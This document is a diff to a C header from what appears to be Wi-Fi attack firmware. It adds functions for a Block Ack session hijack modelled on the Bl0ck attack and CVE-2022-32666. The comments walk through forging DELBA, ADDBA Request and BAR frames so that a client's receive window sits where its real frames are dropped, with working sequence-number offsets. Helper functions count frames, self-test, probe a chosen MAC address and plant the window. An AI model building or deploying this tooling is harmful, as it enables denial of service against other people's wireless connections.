@@ -30,6 +30,34 @@ extern "C" {
 // "requested from peer STA as it does not want to use the mechanism").
 bool delba_start(int index, uint16_t reason);
 
+// BA-session hijack (Bl0ck / CVE-2022-32666 shape), three steps per (client, TID):
+//   1. forged DELBA  -- tear the real session down so our ADDBA is not rejected
+//                       as a duplicate;
+//   2. forged ADDBA Request -- the recipient initialises WinStartB from the SSN
+//                       we put in it, so the window is "planted" where real
+//                       frames cannot reach (12-bit SN space, 64 frame window);
+//   3. forged BAR    -- keeps pushing WinStartB forward as the live SN advances.
+// `ssn_step` (128..2047) is how far ahead of the observed SN the window is put;
+// it must stay inside the standard's WinStartB..WinStartB+2^11 acceptance range.
+bool delba_start_ba(int index, uint16_t ssn_step);
+bool delba_ba_mode(void);
+uint32_t delba_ba_addba_frames(void);
+uint32_t delba_ba_bar_frames(void);
+uint32_t delba_ba_delba_frames(void);
+// Last SSN written into a forged ADDBA / BAR.
+uint16_t delba_ba_last_ssn(void);
+// Dumps one forged ADDBA Request and one forged BAR with decoded fields.
+void delba_ba_selftest(void);
+// Plant the window(s) with a few forged ADDBA frames and then transmit nothing.
+// `ssn_step` 0..127 = control run (window not actually moved).
+bool delba_ba_plant_once(int index, uint16_t ssn_step);
+uint32_t delba_ba_planted_frames(void);
+// Frames the driver refused, and the last esp_err_t it returned.
+uint32_t delba_ba_errors(void);
+int32_t delba_ba_last_error(void);
+// Debug: send one DELBA / ADDBA Request / BAR to `mac`, print the three results.
+void delba_ba_tx_probe(const uint8_t mac[6]);
+
 void delba_stop(void);
 
 // Called from the main loop (via attack_step) every iteration.
